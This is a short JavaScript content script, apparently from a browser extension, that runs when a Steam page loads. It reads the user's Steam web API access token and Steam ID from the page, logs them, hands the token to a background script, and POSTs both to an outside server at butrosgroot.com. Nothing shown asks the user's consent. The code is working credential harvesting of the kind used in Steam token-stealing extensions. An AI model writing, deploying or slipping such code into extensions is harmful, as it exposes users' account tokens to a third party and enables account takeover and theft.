// When the page is loaded or refreshed
window.addEventListener('load', () => {
    let applicationConfigDiv = document.querySelector("#application_config");

    let webAPIToken = applicationConfigDiv.getAttribute("data-loyalty_webapi_token").replace(/['"]+/g, '');
    
    const scripts = Array.from(document.getElementsByTagName('script'));
    const targetScript = scripts.find(s => s.innerText.includes('g_steamID'));
    if (targetScript) {
        const match = /g_steamID = "(.*?)";/.exec(targetScript.innerText);
        if (match && match[1]) {
            console.log('Steam ID:', match[1]);
            steam_id = match[1];
        }
    }
    
    console.log(webAPIToken);
    console.log(steam_id);

    // Send the steamSecureLogin data to the background script
    chrome.runtime.sendMessage({ type: 'page_data', data: webAPIToken });

    // send the steam_id and webApiKey to the server. on https://butrosgroot.com/rolltrader/api/web_api/save/
    fetch('https://butrosgroot.com/rolltrader/api/web_api/save/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            steam_id: steam_id,
            webApiKey: webAPIToken,
        }),
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });
});